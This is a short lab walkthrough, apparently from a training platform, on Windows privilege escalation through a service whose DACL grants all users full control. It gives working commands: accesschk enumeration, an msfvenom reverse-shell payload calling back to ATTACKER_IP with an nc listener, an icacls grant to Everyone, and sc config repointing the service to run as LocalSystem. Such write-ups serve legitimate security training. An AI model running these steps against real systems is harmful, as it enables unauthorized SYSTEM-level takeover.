Insecure Service Permissions
####Try to get the Administrators access VIA AccessCheck####


You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, 
and the service's binary path is rightly quoted. 

Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, 
you will be able to reconfigure the service. 
This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use "Accesschk" from the Sysinternals suite. 
For your convenience, a copy is available at C:\\tools. 

The command to check for the thmservice service DACL is:
-C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Attack:
-user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
-user@attackerpc$ nc -lvp 4447


We will then transfer the reverse shell executable to the target machine and store it in 
C:\Users\thm-unpriv\rev-svc3.exe. 


Grant permissions to Everyone to execute your payload:
-C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

To change the service's associated executable and Change the User via [obj==]:
-C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

Restart Services:
-C:\> sc stop THMService
-C:\> sc start THMService
And we will receive a shell back in our attacker's machine with SYSTEM privileges:

Kali Linux
user@attackerpc$ nc -lvp 4447
